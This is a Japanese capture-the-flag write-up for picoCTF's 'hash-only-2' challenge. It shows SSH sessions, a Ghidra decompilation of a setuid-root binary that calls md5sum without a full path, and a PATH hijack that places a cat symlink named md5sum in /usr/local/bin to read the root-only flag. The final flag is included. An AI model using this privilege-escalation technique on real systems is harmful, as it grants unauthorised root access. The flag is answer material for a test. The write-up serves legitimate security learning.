#### hash-only-2（200 points）

先ほどの問題と似てます。SSH で接続できます。今度は、プログラムバイナリをダウンロードできる、とは言ってないです。

<figure class="figure-image figure-image-fotolife" title="hash-only-2（200 points）">[f:id:daisuke20240310:20250315205138p:plain:alt=hash-only-2（200 points）]<figcaption>hash-only-2（200 points）</figcaption></figure>

SSH で接続してみます。なるほど、今度は、flaghasher の場所が変わっているようです。また、SCP は動かず、同じ方法も出来ませんでした。md5sum に書き込み権限がありませんでした。

```sh
$ ssh ctf-player@rescued-float.picoctf.net -p 61076
The authenticity of host '[rescued-float.picoctf.net]:61076 ([3.20.79.114]:61076)' can't be established.
ED25519 key fingerprint is SHA256:PQC5vOQmf4PDyXxyU4hugIql2NWdyXuXAwj3IO43rI8.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[rescued-float.picoctf.net]:61076' (ED25519) to the list of known hosts.
ctf-player@rescued-float.picoctf.net's password:
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 6.8.0-1023-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

ctf-player@pico-chall$ ls -alF
total 4
drwxr-xr-x 1 ctf-player ctf-player 20 Mar 15 11:53 ./
drwxr-xr-x 1 root       root       24 Mar  6 19:42 ../
drwx------ 2 ctf-player ctf-player 34 Mar 15 11:53 .cache/
-rw-r--r-- 1 root       root       67 Mar  6 19:42 .profile

ctf-player@pico-chall$ which flaghasher
/usr/local/bin/flaghasher

$ ls -alF /usr/local/bin/flaghasher
-rwsr-xr-x 1 root root 18312 Mar  6 19:42 /usr/local/bin/flaghasher*

ctf-player@pico-chall$ flaghasher
Computing the MD5 hash of /root/flag.txt....

cfaa8a682b9556998477d62b1376c4fa  /root/flag.txt

$ scp -P 61076 ctf-player@rescued-float.picoctf.net:~/flaghasher .
ctf-player@rescued-float.picoctf.net's password: 
scp: Connection closed

ctf-player@pico-chall$ ln -s /bin/cat md5sum

ctf-player@pico-chall$ ls -alF
total 24
drwxr-xr-x 1 ctf-player ctf-player    52 Mar 15 11:58 ./
drwxr-xr-x 1 root       root          24 Mar  6 19:42 ../
drwx------ 2 ctf-player ctf-player    34 Mar 15 11:53 .cache/
-rw-r--r-- 1 root       root          67 Mar  6 19:42 .profile
-rwxr-xr-x 1 ctf-player ctf-player 18312 Mar 15 11:55 flaghasher*
lrwxrwxrwx 1 ctf-player ctf-player     8 Mar 15 11:58 md5sum -> /bin/cat*

$ cp md5sum /bin
cp: cannot create regular file '/bin/md5sum': Permission denied

$ ls -alF /bin/md5sum
-rwxr-xr-x 1 root root 47480 Sep  5  2019 /bin/md5sum*
```

scp がうまくいかなかった（制限されてる？）ので、他の方法で、ローカルにコピーします。

```sh
$ ssh ctf-player@rescued-float.picoctf.net -p 53293 cat flaghasher > flaghasher_cat
ctf-player@rescued-float.picoctf.net's password:
```

Ghidra で見てみます。同じに見えますね。実際に比較してみると、同じでした。

```c
bool main(void)
{
  basic_ostream *pbVar1;
  basic_ostream<> *pbVar2;
  char *__command;
  long in_FS_OFFSET;
  bool bVar3;
  allocator<char> local_4d;
  int local_4c;
  basic_string<> local_48 [40];
  long local_20;
  
  local_20 = *(long *)(in_FS_OFFSET + 0x28);
  pbVar1 = std::operator<<((basic_ostream *)std::cout,
                           "Computing the MD5 hash of /root/flag.txt.... ");
  pbVar2 = (basic_ostream<> *)
           std::basic_ostream<>::operator<<((basic_ostream<> *)pbVar1,std::endl<>);
  std::basic_ostream<>::operator<<(pbVar2,std::endl<>);
  sleep(2);
  std::allocator<char>::allocator();
                    /* try { // try from 001013aa to 001013ae has its CatchHandler @ 0010144f */
                    /* } // end try from 001013aa to 001013ae */
  std::__cxx11::basic_string<>::basic_string
            ((char *)local_48,(allocator *)"/bin/bash -c \'md5sum /root/flag.txt\'");
  std::allocator<char>::~allocator(&local_4d);
  setgid(0);
  setuid(0);
  __command = (char *)std::__cxx11::basic_string<>::c_str();
                    /* try { // try from 001013de to 00101423 has its CatchHandler @ 0010146d */
  local_4c = system(__command);
  bVar3 = local_4c != 0;
  if (bVar3) {
    pbVar1 = std::operator<<((basic_ostream *)std::cerr,
                             "Error: system() call returned non-zero value: ");
    pbVar2 = (basic_ostream<> *)std::basic_ostream<>::operator<<((basic_ostream<> *)pbVar1,local_4c)
    ;
                    /* } // end try from 001013de to 00101423 */
    std::basic_ostream<>::operator<<(pbVar2,std::endl<>);
  }
  std::__cxx11::basic_string<>::~basic_string(local_48);
  if (local_20 == *(long *)(in_FS_OFFSET + 0x28)) {
    return bVar3;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

別の方法を考えます。/bin や、/usr/bin より、優先して、見に行ってくれる実行可能なパスを探します。/usr/local/bin に置けば良さそうです。出ました！

```sh
ctf-player@pico-chall$ env
SHELL=/bin/rbash
PWD=/home/ctf-player
LOGNAME=ctf-player
MOTD_SHOWN=pam
HOME=/home/ctf-player
LANG=C.UTF-8
SSH_CONNECTION=127.0.0.1 41264 127.0.0.1 22
TERM=xterm
USER=ctf-player
SHLVL=1
PS1=\[\e[35m\]\u\[\e[m\]@\[\e[35m\]pico-chall\[\e[m\]$
SSH_CLIENT=127.0.0.1 41264 22
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
SSH_TTY=/dev/pts/0
_=/usr/bin/env

ctf-player@pico-chall$ cp md5sum /usr/local/bin/

ctf-player@pico-chall$ flaghasher
Computing the MD5 hash of /root/flag.txt....

picoCTF{Co-@utH0r_Of_Sy5tem_b!n@riEs_dab7e075}
```

